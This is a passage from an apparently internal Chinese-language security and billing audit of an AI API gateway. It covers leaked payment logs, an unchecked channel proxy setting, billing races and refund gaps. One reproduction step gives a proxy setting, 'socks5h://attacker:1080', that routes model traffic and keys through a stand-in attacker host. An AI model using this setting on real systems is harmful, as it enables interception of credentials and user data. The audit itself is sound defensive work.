- 标题：Stripe、Creem、Waffo、Waffo Pancake、Epay 多处日志打印完整支付回调体、签名头、支付参数、客户邮箱/姓名和 checkout URL
- 影响范围：系统日志、集中日志平台、支付客户 PII、支付签名、第三方订单号、订阅订单 `provider_payload`
- 触发条件：任意支付回调、支付请求创建、支付请求失败、日志等级允许 Info/Warn/Error 写入；日志被管理员、运维、外包、SaaS 日志平台或备份系统读取
- 涉及文件/函数：
  - `controller/topup_stripe.go:162-164`：Stripe webhook 收到时记录 `Stripe-Signature` 和完整 body
  - `controller/topup_creem.go:246-255`：Creem webhook 记录签名和完整 body，验签失败也记录
  - `controller/topup_creem.go:322`：Creem 支付完成日志记录客户邮箱、姓名、金额、币种、产品名
  - `controller/topup_creem.go:155`、`controller/topup_creem.go:420-438`：Creem 支付请求 body 和 API 响应 body/checkout_url 被记录
  - `controller/topup_waffo.go:343-354`、`controller/topup_waffo_pancake.go:461-466`：Waffo/Waffo Pancake 记录签名和完整 body
  - `controller/topup.go:264`、`controller/topup.go:337`：Epay 下单参数和 webhook 参数写入日志
  - `model/subscription.go:202-217`、`model/subscription.go:653-658`：订阅订单保存完整 `ProviderPayload`
- 可能后果：支付事件中的邮箱、姓名、订单号、checkout URL、签名头和完整 payload 长期进入日志/数据库，扩大合规和泄露面；部分签名在短时间窗口内可能被重放用于测试/攻击；日志平台泄露会暴露支付流水和用户身份映射，增加补单诈骗、客服社工和账务争议风险。
- 复现思路：本地发起支付或构造失败 webhook，查看应用日志和 `subscription_orders.provider_payload`；确认是否能看到完整 body、签名、客户邮箱/姓名、checkout URL 或支付参数。
- 修复建议：支付日志改成结构化白名单字段，只保留 `trade_no`、provider event id、金额、币种、状态和脱敏邮箱；签名头、完整 body、checkout URL、客户姓名默认不写日志；需要排障时用短期 debug 开关并自动脱敏。数据库 `provider_payload` 应只保存最小必要字段或加密保存并设置保留期。
- 优先级：P1
- 当前状态：已确认多处完整敏感 payload 日志和持久化，尚未修复。

### 风险 38：渠道 `proxy` 配置无安全边界校验，管理员可把上游请求和密钥流量导向任意代理

- 标题：渠道设置支持 http/https/socks5/socks5h 代理，但保存阶段只校验 JSON 格式，不校验代理地址、私网、域名、端口或权限等级
- 影响范围：所有使用该渠道的模型请求、请求体、响应体、Authorization/API key、Codex/OAuth 刷新、渠道余额和模型拉取
- 触发条件：管理员误填或恶意设置渠道 `setting.proxy`；管理员账号被盗；代理服务被攻击者控制；普通业务流量继续命中该渠道
- 涉及文件/函数：
  - `router/api-router.go:233-247`：渠道新增/更新为 `AdminAuth`
  - `dto/channel_settings.go:3-7`：渠道设置包含 `Proxy string`
  - `controller/channel.go:456-461`、`model/channel.go:940-948`：`validateChannel`/`ValidateSettings` 只校验 JSON 能否解析
  - `controller/channel.go:587-604`、`controller/channel.go:863-878`：新增/更新渠道时没有校验 proxy 目标
  - `service/http_client.go:101-165`：`NewProxyHttpClient` 接受 http/https/socks5/socks5h，未套用 `fetch_setting` 对 proxy 本身做校验
  - `relay/channel/api_request.go:491`、`controller/channel-billing.go:147`、`controller/codex_usage.go:62`：业务请求、余额查询和 Codex 使用该 proxy 发起外部请求
- 可能后果：一个管理员级账号可以把渠道流量透明导到任意代理，代理能观察请求体、响应、模型输入输出和上游密钥使用特征；如果代理指向内网或恶意地址，还会造成出站链路不可控、成本异常和隐私泄露。Root-only 的“查看渠道密钥”保护无法阻止通过代理间接获取密钥价值和流量内容。
- 复现思路：创建或更新渠道时写入 `setting={"proxy":"socks5h://attacker:1080"}`，发起一次模型调用或渠道余额查询；观察请求是否经过该代理，并确认没有额外安全验证或审计原因字段。
- 修复建议：渠道 proxy 变更提升到 RootAuth 或独立高危权限，保存时按 SSRF/出站代理白名单校验；记录变更审计，包括旧值、新值、管理员、原因；默认禁止私网代理和非标准端口。敏感渠道建议只允许系统级静态代理配置，不允许后台任意填写。
- 优先级：P1
- 当前状态：已确认渠道 proxy 只做格式解析，尚未修复。

### 风险 39：异步任务成功后先结算再插入任务，插入失败会留下已扣费但不可追踪的任务

- 标题：`RelayTaskSubmit` 成功后立即 `SettleBilling` 和 `LogTaskConsumption`，随后 `task.Insert()` 失败只写系统日志，没有回滚资金/令牌/统计，也没有任务记录可供后续退款或重算
- 影响范围：图像/视频等异步任务、钱包余额、订阅额度、令牌额度、任务消费日志、后续任务轮询和客服退款
- 触发条件：上游任务提交成功并返回 `UpstreamTaskID`；本地数据库插入任务失败、唯一键冲突、数据库短暂不可用、序列化字段异常或事务外写入失败
- 涉及文件/函数：
  - `controller/relay.go:572-597`：成功分支先 `service.SettleBilling(c, relayInfo, result.Quota)`，再 `service.LogTaskConsumption(c, relayInfo)`，最后 `task.Insert()`；插入失败仅 `common.SysError`
  - `service/task_billing.go:17-65`：`LogTaskConsumption` 记录消费日志并增加 `users.used_quota`、`channels.used_quota`
  - `service/billing.go:34-77`、`service/billing_session.go:41-79`：`SettleBilling` 提交资金来源和令牌差额，成功后会把 BillingSession 标记为 settled
- 可能后果：用户余额/订阅/令牌已经扣除，消费统计也已增加，但 `tasks` 表没有记录；后续轮询、失败退款、实际 token 重算和人工对账都找不到任务锚点，形成“扣费成功但任务丢失”的运营争议。若上游实际继续执行，还可能同时造成上游成本和用户体验投诉。
- 复现思路：本地让 `RelayTaskSubmit` 返回成功结果，然后模拟 `task.Insert()` 返回错误；观察是否已经扣减额度、写入消费日志和更新统计，同时没有任务记录可退款。
- 修复建议：异步任务提交成功后的本地落库、计费结算和消费日志应进入可补偿流程。优先方案是先插入 pending 任务并保存上游任务号，再结算；若必须先扣费，则 `task.Insert()` 失败必须同步回滚资金、令牌、统计和日志，或写入独立 outbox/reconcile 表等待补偿。
- 优先级：P1
- 当前状态：已确认任务成功路径存在“结算/日志在前、任务插入在后”的不可补偿窗口，尚未修复。

### 风险 40：异步任务退款和向下重算只退还余额/订阅，不回滚 used_quota、request_count 和渠道成本统计

- 标题：`RefundTaskQuota` 和 `RecalculateTaskQuota` 的退款分支没有抵减用户已用额度、请求次数和渠道已用额度，导致账面成本长期高估
- 影响范围：用户 `used_quota`、请求次数、渠道 `used_quota`、成本报表、渠道利润率、用户消费排行、异步任务失败退款和实际用量重算
- 触发条件：异步任务失败触发 `RefundTaskQuota`；异步任务完成后实际额度小于预扣额度触发 `RecalculateTaskQuota(actualQuota < task.Quota)`；任务使用钱包或订阅均受影响
- 涉及文件/函数：
  - `service/task_billing.go:53-64`：任务提交时记录消费日志并增加用户/渠道统计
  - `service/task_billing.go:150-181`：`RefundTaskQuota` 只退资金来源和令牌额度，记录退款日志，不减少 `used_quota` 或渠道统计
  - `service/task_billing.go:187-245`：`RecalculateTaskQuota` 在 `quotaDelta > 0` 时增加用户/渠道统计；`quotaDelta < 0` 时只记退款日志，不做统计抵减
- 可能后果：用户实际余额被退回，但后台仍显示用户已消费、渠道已消耗和请求次数增加；运营会误判用户成本、渠道成本和毛利。大量失败任务或高预扣低实扣任务会把渠道成本报表推高，影响自动调度、定价和客服对账。
- 复现思路：提交一个预扣额度较高的异步任务，随后让任务失败触发退款，或让任务成功后以更低 token 数触发重算；检查用户余额已返还，但 `users.used_quota`、渠道 `used_quota` 和请求次数没有按退款金额回滚。
- 修复建议：将任务消费统计改成可正负调整的统一账本；退款和向下重算时同步抵减用户 used_quota、渠道 used_quota，并明确 request_count 是否代表“请求次数”还是“计费成功次数”。报表优先从消费/退款流水净额聚合，避免只靠累加字段。
- 优先级：P1
- 当前状态：已确认异步任务退款/向下重算没有回滚统计字段，尚未修复。

### 风险 41：成功响应只要 `TotalTokens == 0` 就把实际扣费清零，上游漏返回 usage 时可出现免费调用或少扣费

- 标题：文本、音频、实时计费路径在 `TotalTokens == 0` 时强制 `quota = 0`，并跳过用户/渠道统计；固定价格、工具附加费或成功但 usage 缺失的响应也会被清零
- 影响范围：普通模型调用、流式响应、音频/实时模型、固定价格模型、Web Search/File Search/Image Generation 附加费、钱包/订阅/令牌结算、渠道成本统计
- 触发条件：上游成功返回内容但未返回 usage；适配器解析 usage 失败；流式响应结束但 usage 缺失；固定价格或工具调用本应收费但 `TotalTokens` 为 0
- 涉及文件/函数：
  - `service/text_quota.go:287-304`：即使已算出固定价格、工具附加费或其他费用，只要 `summary.TotalTokens == 0` 就把 `summary.Quota = 0`
  - `service/text_quota.go:419-427`：`TotalTokens == 0` 时只记错误和提示，不更新用户/渠道统计，随后按 0 调用 `SettleBilling`
  - `service/quota.go:216-230`、`service/quota.go:337-351`：音频/实时路径在 total tokens 为 0 时也把 `quota = 0`，然后按 0 结算
  - `service/billing.go:34-77`：结算实际额度为 0 时会返还或不扣预扣差额
- 可能后果：某些上游或模型如果稳定不返回 usage，用户可获得成功响应但最终不扣费，渠道成本也不入账；固定价或工具附加费被 `TotalTokens == 0` 覆盖后也可能丢失收费。该问题不一定是恶意用户直接控制，但一旦某上游适配器缺 usage，会形成系统性漏收。
- 复现思路：本地构造一个成功响应，内容正常但 usage 为空或 total_tokens 为 0；确认日志出现“上游没有返回计费信息，无法扣费”，用户余额返还/未扣，渠道 used_quota 不增加。
- 修复建议：区分“请求失败/超时无 usage”和“成功响应但 usage 缺失”。成功响应缺 usage 时应使用本地 token 估算、固定价格兜底或最小扣费；工具附加费/固定价不应被 `TotalTokens == 0` 一刀切清零。对持续缺 usage 的渠道应自动降级、告警或禁用。
- 优先级：P1
- 当前状态：已确认多条成功后结算路径以 `TotalTokens == 0` 清零实际扣费，尚未修复。

### 风险 45：订阅预扣依赖疑似无效的 `FOR UPDATE`，并发请求可能超额消耗同一订阅额度

- 标题：`PreConsumeUserSubscription` 先读取订阅 `AmountUsed`，再 `sub.AmountUsed += amount` 后 `Save`；没有条件更新或数据库约束保证 `amount_used + amount <= amount_total`
- 影响范围：订阅额度、订阅优先/钱包优先计费、令牌预扣、用户可用余额、并发模型调用
- 触发条件：同一用户同一订阅同时发起多次模型请求；订阅剩余额度只够其中一部分请求；数据库/GORM 行锁不生效或多实例并发执行
- 涉及文件/函数：
  - `model/subscription.go:1073-1175`：`PreConsumeUserSubscription` 在事务内读取 active subscriptions，按本地 `usedBefore` 判断剩余额度
  - `model/subscription.go:1110-1114`：使用 `tx.Set("gorm:query_option", "FOR UPDATE")` 查询订阅
  - `model/subscription.go:1130-1135`：用读取到的 `AmountUsed` 计算 remain，不是数据库条件扣减
  - `model/subscription.go:1158-1160`：直接 `sub.AmountUsed += amount` 并 `tx.Save(&sub)`
  - 已有同类证据：风险 31 已确认当前 GORM v2 用法下多处 `Set("gorm:query_option", "FOR UPDATE")` 疑似不产生真实行锁
- 可能后果：两个并发请求都看到相同剩余额度并同时通过校验，最终 `amount_used` 可能丢失一次更新或被错误覆盖；用户获得超过订阅额度的调用，或者订阅/令牌/日志三方状态不一致。订阅优先模式下，这会直接变成平台少扣钱包余额。
- 复现思路：构造一个剩余额度为 N 的订阅，同时发起两个各消耗 N 的请求；观察两个请求是否都通过预扣，以及最终 `amount_used` 是否只增加一次或超过可用额度。
- 修复建议：订阅预扣改成单条条件更新：`UPDATE user_subscriptions SET amount_used = amount_used + ? WHERE id = ? AND status='active' AND end_time>? AND (amount_total=0 OR amount_used + ? <= amount_total)`，检查 RowsAffected；或使用数据库原生锁子句。并发测试要覆盖 MySQL/PostgreSQL/SQLite 差异。
- 优先级：P1
- 当前状态：已确认订阅预扣没有条件扣减保护，依赖疑似无效行锁，尚未修复。

### 风险 46：订阅预扣退款在外层事务里调用独立事务，记录状态更新失败时可能重复退款

- 标题：`RefundSubscriptionPreConsume` 先通过独立 `PostConsumeUserSubscriptionDelta` 退订阅额度，再把预扣记录标记为 `refunded`；两步不是同一事务
- 影响范围：订阅额度退款、请求失败返还、异步 BillingSession Refund、重复退款、订阅 amount_used
- 触发条件：请求失败触发订阅预扣退款；`PostConsumeUserSubscriptionDelta` 已成功提交，但外层事务保存 `SubscriptionPreConsumeRecord.Status=refunded` 失败、连接中断、进程退出或死锁回滚；随后退款逻辑重试
- 涉及文件/函数：
  - `model/subscription.go:1177-1200`：`RefundSubscriptionPreConsume` 开启事务并锁定预扣记录
  - `model/subscription.go:1195-1199`：先调用 `PostConsumeUserSubscriptionDelta(record.UserSubscriptionId, -record.PreConsumed)`，再把记录状态改为 `refunded`
  - `model/subscription.go:1286-1309`：`PostConsumeUserSubscriptionDelta` 自己使用 `DB.Transaction`，没有复用外层 `tx`
  - `service/funding_source.go:111-117`、`service/billing_session.go:81-120`：订阅退款会通过该函数重试
- 可能后果：订阅 `amount_used` 已经减少，但预扣记录仍是 `consumed`，下一次重试会再次减少；由于 `PostConsumeUserSubscriptionDelta` 对负数会夹到 0，重复退款可能被静默掩盖，用户订阅额度被多退，审计只能看到预扣记录仍未退款或最终一次退款成功。
- 复现思路：在 `PostConsumeUserSubscriptionDelta` 成功后、`record.Status` 保存前注入错误；再次调用 `RefundSubscriptionPreConsume(requestId)`，观察 `amount_used` 是否被重复减少。
- 修复建议：把 `PostConsumeUserSubscriptionDelta` 改成接收并复用当前 `tx`，或在同一事务里直接条件更新订阅和预扣记录；退款记录状态建议先条件更新为 `refunding` 并带幂等保护，再执行额度回退，失败可由补偿任务按状态修复。
- 优先级：P1
- 当前状态：已确认订阅退款拆成外层事务和独立事务，尚未修复。

### 风险 47：多个升级分组订阅叠加时，高级套餐过期/取消后可能不会回退到仍有效的次级套餐分组

- 标题：降级逻辑只要发现还有任意 active upgraded subscription 就直接保持当前用户组，不会把用户组切到剩余 active 订阅的 `upgrade_group`
- 影响范围：订阅升级分组、用户组倍率、模型权限、渠道组权限、套餐到期/取消、管理员删除订阅
- 触发条件：用户先购买升级到 A 组的长周期套餐，再购买升级到 B 组的短周期套餐；B 到期或被取消时，A 仍 active；当前用户组为 B
- 涉及文件/函数：
  - `model/subscription.go:547-606`：创建订阅时记录 `UpgradeGroup` 和当时的 `PrevUserGroup`
  - `model/subscription.go:512-545`：`downgradeUserGroupForSubscriptionTx` 发现其他 active upgraded subscription 时直接 `return ""`
  - `model/subscription.go:832-875`、`model/subscription.go:877-916`：管理员取消/删除订阅复用该降级逻辑
  - `model/subscription.go:926-1010`：定时过期时如果发现任意 active upgraded subscription，也直接跳过降级
  - `model/user_cache.go:213-215`：缓存只在返回了目标 group 时更新；跳过降级时缓存也保持旧高权限组
- 可能后果：高级短周期套餐过期后，用户仍留在高级组 B，而不是回退到仍有效的次级组 A；当次级套餐最终过期时，由于当前组已不是 A，后续回退也可能失效，形成长期越权的用户组、倍率和模型访问权限。
- 复现思路：用户原组 default，创建长周期套餐 A(`upgrade_group=vip`)，再创建短周期套餐 B(`upgrade_group=svip`)；让 B 先过期或管理员取消 B，检查用户组是否仍是 `svip` 而不是 `vip`。
- 修复建议：降级时不要只判断“存在其他升级订阅”，而应选择当前仍 active、优先级最高/结束时间最晚的订阅，并把用户组设置为它的 `upgrade_group`；如果没有 active 升级订阅，再回退到最可信的原始组。需要为多订阅叠加建立明确优先级和测试矩阵。
- 优先级：P1
- 当前状态：已确认叠加升级订阅的降级路径可能保留过期高级组，尚未修复。

### 风险 50：Gemini/Vertex 实时查询可把任务推进终态，但绕过失败退款和成功差额结算

- 标题：用户 GET 视频任务详情时，`tryRealtimeFetch` 会直接从上游拉取状态并 `UpdateWithStatus` 写入 SUCCESS/FAILURE；该路径没有调用 `RefundTaskQuota` 或 `settleTaskBillingOnComplete`
- 影响范围：Gemini/Vertex 视频任务、OpenAI Video API 查询、任务失败退款、任务成功后 token 重算/adaptor 计费调整、钱包/订阅/令牌额度
- 触发条件：用户在后台轮询任务处理前主动查询 `/v1/videos/:task_id` 或 `/v1/video/generations/:task_id`；上游此时已经返回 SUCCESS 或 FAILURE；任务来自 Gemini/Vertex 渠道
- 涉及文件/函数：
  - `relay/relay_task.go:362-385`：`videoFetchByIDRespBodyBuilder` 对 Gemini/Vertex 先调用 `tryRealtimeFetch`
  - `relay/relay_task.go:421-478`：`tryRealtimeFetch` 拉取上游状态后更新 `task.Status`、`Progress`、`ResultURL`，并 `task.UpdateWithStatus(snap.Status)`
  - `service/task_polling.go:473-499`：后台视频轮询在终态 CAS 成功后才执行 `settleTaskBillingOnComplete` 或 `RefundTaskQuota`
  - `service/task_polling.go:543-557`：成功完成后的 adaptor 调整/token 重算只在后台轮询路径执行
  - `model/task.go:306-314`：后台轮询只选未完成任务；实时 fetch 已写成 SUCCESS/FAILURE 后，后台不再处理该任务
- 可能后果：失败任务被实时查询写成 FAILURE 后不退款；成功任务被实时查询写成 SUCCESS 后不做实际 token 重算或 adaptor 计费调整，预扣额度可能长期偏高或偏低。用户越早查询，越可能抢在后台轮询前改变结算路径，形成可操作的账务不一致。
- 复现思路：提交 Gemini/Vertex 视频任务后，模拟上游返回 FAILURE 或带 `TotalTokens` 的 SUCCESS；在后台轮询前调用任务查询接口；检查任务状态变为终态，但余额/订阅/令牌退款或差额结算没有发生。
- 修复建议：所有能把任务推进终态的路径必须共用同一个“终态 CAS + 结算/退款”函数；`tryRealtimeFetch` 只做只读展示，或在 CAS 赢得终态更新后同步调用与后台轮询相同的退款/重算逻辑。
- 优先级：P1
- 当前状态：已确认实时查询终态更新绕过结算/退款逻辑，尚未修复。

### 风险 51：Suno 任务轮询仍使用无 CAS 的状态更新，失败退款可能重复执行或在更新失败后反复执行

- 标题：Suno 分支在检测失败时先调用 `RefundTaskQuota`，随后 `task.Update()` 无条件保存；没有 CAS 判断本次是否赢得终态迁移，也没有在更新成功后再退款
- 影响范围：Suno 异步任务、失败退款、钱包/订阅/令牌额度、任务状态和消费日志
- 触发条件：Suno 任务失败；多个 master/轮询进程并发处理同一任务；`task.Update()` 失败；上游重复返回失败状态；任务状态在保存前被其他流程改动
- 涉及文件/函数：
  - `service/task_polling.go:223-248`：Suno 逐条处理上游返回，失败时直接 `RefundTaskQuota(ctx, task, task.FailReason)`，随后 `task.Update()`
  - `service/task_polling.go:252-288`：`taskNeedsUpdate` 只比较字段，不提供终态迁移互斥
  - `model/task.go:398-401`：`Task.Update()` 是普通 `DB.Save`
  - 对比证据：`service/task_polling.go:473-499` 的视频分支使用 `UpdateWithStatus` 赢得终态 CAS 后才退款或结算
- 可能后果：同一失败 Suno 任务可被多个轮询进程重复退款；如果退款成功但 `task.Update()` 失败，任务仍是未完成状态，下一轮会再次退款。对于订阅资金来源，还会叠加风险 46 的重复退款窗口。
- 复现思路：构造 Suno 任务失败响应，在 `RefundTaskQuota` 后让 `task.Update()` 返回错误；下一轮再次处理同一任务，观察退款是否再次执行。
- 修复建议：Suno 分支迁移到与视频分支相同的终态 CAS 流程：先构建快照，`UpdateWithStatus` 成功后再退款/结算；退款函数还应按 task id 建立幂等账本，避免仅依赖任务状态。
- 优先级：P1
- 当前状态：已确认 Suno 失败退款路径没有 CAS 保护，尚未修复。

### 风险 52：部分任务被批量标记失败时没有退款，渠道缺失或上游任务 ID 缺失会造成扣费后无补偿

- 标题：轮询发现 `UpstreamTaskID` 为空、渠道缓存缺失或渠道被删除时，会批量把任务置为 FAILURE/100%，但没有调用 `RefundTaskQuota`
- 影响范围：异步任务、渠道删除/禁用后的未完成任务、任务插入缺陷、钱包/订阅/令牌预扣额度、客服补偿
- 触发条件：任务记录没有上游任务 ID；渠道被删除或缓存无法读取；任务提交成功并已预扣，但后续轮询拿不到渠道信息；管理员误删渠道
- 涉及文件/函数：
  - `service/task_polling.go:108-129`：`upstreamID == ""` 的任务通过 `TaskBulkUpdateByID` 置失败，没有退款
  - `service/task_polling.go:170-188`：Suno 渠道读取失败时批量置失败，没有退款
  - `service/task_polling.go:305-322`：视频任务渠道读取失败时批量置失败，没有退款
  - `model/task.go:430-441`：`TaskBulkUpdateByID` 明确无 CAS，只做普通批量更新
  - `controller/relay.go:572-597`：任务提交成功后先结算/记录日志再插入任务，说明这些任务可能已经扣过费
- 可能后果：任务被标记为失败且不再进入未完成轮询，但用户预扣额度不返还；由于状态已是 FAILURE/100%，后续自动退款路径也不会再看到它。管理员删除渠道或缓存异常会变成大批任务扣费不退的运营事故。
- 复现思路：创建一个已扣费的未完成任务，清空 `private_data.upstream_task_id` 或删除其渠道；触发轮询，观察任务变为 FAILURE/100%，但余额/订阅/令牌未返还。
- 修复建议：任何把未完成任务推进 FAILURE 的路径都必须走统一终态函数并执行退款；批量失败只能更新状态，不应绕过结算生命周期。渠道缺失时可先标记为“待人工处理/轮询暂停”，不要直接失败且不退款。
- 优先级：P1
- 当前状态：已确认多条批量失败路径没有退款，尚未修复。

### 风险 53：Gemini 视频代理把 API key 拼进结果 URL，错误日志会记录完整带 key 的 URL

- 标题：`ensureAPIKey` 将 Gemini key 放到查询参数；`VideoProxy` 请求失败或非 200 时日志打印完整 `videoURL`
- 影响范围：Gemini 视频结果代理、渠道 API key、应用日志、集中日志平台、用户视频下载链路
- 触发条件：Gemini 任务结果 URL 不自带 key；用户请求 `/v1/videos/:task_id/content`；远端下载失败、超时、返回非 200 或被代理/网络中断
- 涉及文件/函数：
  - `controller/video_proxy_gemini.go:15-67`：`getGeminiVideoURL` 从任务数据或上游拉取结果 URL 后调用 `ensureAPIKey`
  - `controller/video_proxy_gemini.go:283-294`：`ensureAPIKey` 直接追加 `?key=` 或 `&key=`
  - `controller/video_proxy.go:146-155`：下载失败和非 200 时日志记录完整 `videoURL`
  - `controller/video_proxy.go:161-169`：代理响应时还会透传上游 headers 并流式返回内容
- 可能后果：Gemini API key 进入日志、APM、反向代理访问日志或错误平台；任何能读日志的人都可复制该 URL 或提取 key。视频代理本身本应隐藏上游密钥，但错误分支反而扩大泄露面。
- 复现思路：构造 Gemini 任务结果 URL，触发下载时让远端返回 403/500 或连接失败；检查日志中是否出现 `?key=<api key>`。
- 修复建议：不要把 key 放在可日志化 URL 中，优先使用 header；如果必须使用 query 参数，所有日志必须先脱敏 `key`、`api_key`、`token` 等参数。错误日志记录 host/path 和状态即可，不记录完整查询串。
- 优先级：P1
- 当前状态：已确认 Gemini 视频代理存在 key-in-URL 和完整 URL 日志组合风险，尚未修复。

### 风险 55：MJProxy 提交仍是“先查余额、上游成功后再扣费”，并发提交或扣费失败会产生免费任务

- 标题：`RelayMidjourneySubmit` 和 `RelaySwapFace` 只在提交前检查用户余额，成功后用 `PostConsumeQuota` 扣费且错误只写日志；没有统一 `BillingSession` 预扣、结算和失败回滚
- 影响范围：Midjourney imagine/change/video/blend/describe/shorten/upload/swap-face、钱包余额、订阅额度、token 额度、消费日志、渠道成本统计
- 触发条件：同一用户并发提交多个 MJ 任务；用户余额刚好够一个任务；`PostConsumeQuota` 在上游成功后失败；token 额度/订阅额度扣减失败；数据库短暂错误；旧 MJ 路径未走新 task 预扣链路
- 涉及文件/函数：
  - `relay/mjproxy_handler.go:512-520`：提交前只读取 `GetUserQuota` 并做 `userQuota-priceData.Quota < 0` 判断
  - `relay/mjproxy_handler.go:527-555`：上游返回后 defer 中调用 `service.PostConsumeQuota`，错误仅 `common.SysLog`
  - `relay/mjproxy_handler.go:183-249`：SwapFace 也是成功后 defer 扣费并忽略错误
  - `service/quota.go:406-444`：`PostConsumeQuota` 扣钱包/订阅和 token，但调用方没有失败补偿
  - 对比证据：`relay/relay_task.go:205-210` 和 `service/billing.go:17-25` 的新 task 路径有预扣 `PreConsumeBilling`
- 可能后果：并发请求都通过余额检查，随后上游都创建任务；后扣费失败时用户仍收到成功任务但平台没有扣到余额/订阅/token。即使扣费部分成功，日志和渠道统计也可能与实际资金来源不一致。
- 复现思路：给用户只够一次 MJ 的额度，同时并发提交两次 imagine；或让 `PostConsumeQuota` 返回错误，观察上游任务已经成功、接口返回成功，但余额/订阅/token 没有正确扣减。
- 修复建议：MJProxy 旧路径迁移到统一 `BillingSession`：提交前预扣，成功后结算，失败或插入失败时退款；所有扣费错误必须影响响应或进入补偿队列，不能只写系统日志。
- 优先级：P1
- 当前状态：已确认 MJProxy 旧提交路径没有预扣和扣费失败补偿，尚未修复。

### 风险 56：MJProxy 上游成功后任务落库失败仍会执行扣费，形成已扣费但无任务记录

- 标题：`RelayMidjourneySubmit` 和 `RelaySwapFace` 的扣费 defer 在任务 `Insert()` 前注册；如果插入任务失败，函数返回错误但 defer 仍会扣用户额度
- 影响范围：MJ 任务记录、钱包/订阅/token 扣费、消费日志、失败退款、客服查询
- 触发条件：上游 MJProxy 返回 200 且 code 表示提交/排队/已存在；本地 `midjourneyTask.Insert()` 失败；数据库不可用、唯一冲突、字段过长或连接中断
- 涉及文件/函数：
  - `relay/mjproxy_handler.go:527-555`：扣费 defer 在解析上游响应后注册
  - `relay/mjproxy_handler.go:626-632`：`midjourneyTask.Insert()` 失败时直接返回 `insert_midjourney_task_failed`
  - `relay/mjproxy_handler.go:226-249`、`relay/mjproxy_handler.go:270-273`：SwapFace 同样先注册扣费 defer，再插入任务
  - `model/midjourney.go:148-151`：MJ 任务插入是普通 `DB.Create`
- 可能后果：用户被扣费，消费日志和渠道 used_quota 被增加，但 `midjourneys` 表没有任务记录；后续轮询、图片代理、失败退款和用户自助查询都无法定位任务。上游如果继续执行，客服只能靠上游账单人工追踪。
- 复现思路：模拟 MJProxy 返回 code=1，然后让 `midjourneyTask.Insert()` 返回错误；确认 defer 仍调用 `PostConsumeQuota` 并写消费/渠道统计。
- 修复建议：先落库 pending 任务或 outbox，再调用上游；如果必须先调上游，则插入失败后必须同步回滚扣费或写入可补偿记录。扣费 defer 应在本地任务记录成功后才启用。
- 优先级：P1
- 当前状态：已确认 MJProxy 存在上游成功、落库失败后仍扣费的窗口，尚未修复。

### 风险 57：旧 Midjourney 失败退款只退用户余额，且批量失败路径完全不退款

- 标题：MJ 轮询失败时只 `IncreaseUserQuota`，不退 token/订阅、不回滚 used_quota/channel used_quota；`mj_id` 为空或渠道缺失时批量置失败但不退款
- 影响范围：旧 `midjourneys` 表、MJ 失败退款、token 额度、订阅额度、用户 used_quota、渠道成本、批量轮询
- 触发条件：MJ 任务失败、超时、渠道被删除、渠道缓存读取失败、任务缺少 `MjId`；任务提交时已经按旧路径扣费
- 涉及文件/函数：
  - `controller/midjourney.go:168-196`：失败时 CAS 成功后只 `model.IncreaseUserQuota(task.UserId, task.Quota, false)` 并记录退款日志
  - `controller/midjourney.go:47-56`：`MjId` 为空的未完成任务被 `MjBulkUpdateByTaskIds` 置 FAILURE/100%，没有退款
  - `controller/midjourney.go:67-78`：渠道缓存失败时 `MjBulkUpdate` 置 FAILURE/100%，没有退款
  - `model/midjourney.go:173-182`：批量更新没有 CAS，也没有计费生命周期钩子
  - 对比证据：`service/task_billing.go:150-181` 的新 task 路径至少区分钱包/订阅/token 退款
- 可能后果：钱包用户可能只退余额但 token 已用额度不回滚；订阅用户可能完全退错资金来源；用户/渠道统计仍保持已消费；批量失败的任务则直接扣费不退。大量 MJ 失败或渠道删除会造成严重账务争议。
- 复现思路：创建一个已扣费 MJ 任务并模拟失败，检查用户余额、token remain/used、订阅 amount_used、用户 used_quota 和渠道 used_quota 的变化；再模拟渠道缺失，观察批量失败不执行任何退款。
- 修复建议：旧 MJ 任务也保存 BillingContext、BillingSource、SubscriptionId、TokenId，并统一调用 `RefundTaskQuota`/`RecalculateTaskQuota`；批量失败必须逐条 CAS 后退款，不能绕过账务生命周期。
- 优先级：P1
- 当前状态：已确认旧 MJ 退款和批量失败路径没有完整账务回滚，尚未修复。

### 风险 60：通用设置 `UpdateOption` 忽略数据库写入错误，可能出现“内存已生效、数据库未持久化”的配置分叉

- 标题：`model.UpdateOption` 对 `FirstOrCreate` 和 `Save` 都没有检查 `.Error`，随后仍调用 `updateOptionMap` 更新本进程内存
- 影响范围：所有 `/api/option` 根管理员设置、支付密钥、充值单价、兑换/邀请额度、SSRF 开关、模型价格、渠道自动禁用、登录注册安全开关、多实例配置一致性
- 触发条件：根管理员保存任意设置时数据库写失败、连接闪断、唯一键/字段错误、主从切换、事务外写入失败；或数据库写入慢失败但本地内存已经更新
- 涉及文件/函数：
  - `router/api-router.go:189-203`：`/api/option` 组由 `RootAuth` 保护，通用 PUT 设置入口是 `controller.UpdateOption`
  - `controller/option.go:120-152`：通用入口只对少数支付合规字段和部分开关做特殊保护
  - `controller/option.go:344-352`：接口根据 `model.UpdateOption` 返回值决定是否返回成功
  - `model/option.go:210-223`：`DB.FirstOrCreate`、`DB.Save` 未检查错误，仍返回 `updateOptionMap(key, value)`
  - `model/option.go:259-262`：`updateOptionMap` 先写 `common.OptionMap`
- 可能后果：管理员看到保存成功，本机运行时已经切换到新价格/新支付开关/新安全开关，但数据库没有保存；重启或其他实例继续使用旧配置。支付回调、充值下单、渠道扣费和用户登录安全判断可能在不同实例上不一致，形成难以对账的运营事故。
- 复现思路：在本地测试中让 `DB.Save(&option)` 返回错误或断开测试数据库，再调用 `model.UpdateOption("QuotaPerUnit", "0.01")`；观察函数仍可能只返回内存解析结果，当前进程配置已变更但数据库无持久化。
- 修复建议：所有 DB 写入必须检查 `.Error`，只有持久化成功后才能刷新内存；`FirstOrCreate` 和 `Save` 放入事务；失败时接口返回错误并保留旧内存状态。对支付、安全、价格类设置增加审计日志和变更版本号。
- 优先级：P1
- 当前状态：已确认通用设置写入存在忽略 DB 错误后继续热更新内存的代码路径，尚未修复。

### 风险 61：配置解析错误被静默吞掉，数据库/OptionMap 显示新值但 typed runtime 仍保持旧值或变成 0

- 标题：分层配置反射更新遇到 bool/int/float/json 解析错误直接 `continue`；传统配置大量 `Atoi/ParseFloat` 忽略错误，错误值可能被当成 0
- 影响范围：`payment_setting.*`、`fetch_setting.*`、`billing_setting.*`、`tool_price_setting.*`、`QuotaPerUnit`、`Price`、`USDExchangeRate`、`MinTopUp`、`StripeUnitPrice`、`WaffoUnitPrice`、`RetryTimes`、`StreamCacheQueueLength`、权限和注册登录开关
- 触发条件：管理员输入非法数字/JSON/bool，前端序列化异常，批量导入配置，手工改库，版本升级后字段类型变化
